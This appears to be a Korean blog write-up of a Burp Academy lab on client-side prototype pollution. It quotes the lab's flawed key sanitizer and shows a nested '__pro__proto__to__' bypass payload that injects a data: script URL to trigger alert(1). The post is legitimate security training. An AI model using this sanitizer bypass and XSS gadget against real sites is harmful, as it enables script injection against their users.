---
layout: post
title: "Burp Academy-Prototype Pollution 다섯번째 문제:Client-side prototype pollution via flawed sanitization"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Prototype Pollution]
toc: true
---


# 개요
- 프로토타입 폴루션(Prototype Pollution, 프로토타입 오염) 취약점 다섯번째 문제이다. 
- 문제 주소: https://portswigger.net/web-security/prototype-pollution/preventing/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization
- 프로토타입 폴루션 설명 주소
1. https://portswigger.net/web-security/prototype-pollution
2. https://portswigger.net/web-security/prototype-pollution/preventing
- 난이도: PRACTITIONER (중간)

# 문제 분석 
프로토타입 폴루션 문제 4번처럼 이번에도 방어코드에 허점이 있는 경우이다. 

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

Find a source that you can use to add arbitrary properties to the global Object.prototype.

Identify a gadget property that allows you to execute arbitrary JavaScript.

Combine these to call alert().
```

# 풀이 
코드를 확인해본다. `searchLoggerFiltered.js` 파일을 본다. 

```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

window.addEventListener("load", searchLogger);
```

`sanitizeKey` 함수에 `badProperties` 라는 이름으로 프로토타입 폴루션에서 쓰이는 파라메터이름이 지정되어 있고, 이 이름이 포함된 경우 replaceAll 함수에 의해 공백으로 치환된다. 

https://portswigger.net/web-security/prototype-pollution/preventing 에도 설명이 있지만 이 코드는 허점이 있다. 예를들어, `__pro__proto__to__` 같은 식으로 파라메터를 전달하면 replaceAll에 의해 `__proto__` 부분이 공백으로 처리되어 `__pro` 와 `to__` 가 남는다. 결과적으로 `__proto__`파라메터가 부활한다. 

## 공격용 코드 만들기
이제까지의 경험을 살려서 다음과 같은 페이로드를 만든다. 

```
&__pro__proto__to__[transport_url]=data:text/javascript,alert(1)
```

URL전체적으로는 다음과 같은 형태이다. 
```
https://0ac5003f03b867fec421fa2c008b00bf.web-security-academy.net/?search=dd&__pro__proto__to__[transport_url]=data:text/javascript,alert(1)
```

시도해보면 alert창이 뜨는 것을 확인할 수 있다. 

![UNKNOWN_URL_SCHEME 에러](/images/burp-academy-prototype-pollution-5-1.png)

OK버튼을 누르면 축하한다는 메세지가 나온다. 

![UNKNOWN_URL_SCHEME 에러](/images/burp-academy-prototype-pollution-5-success.png)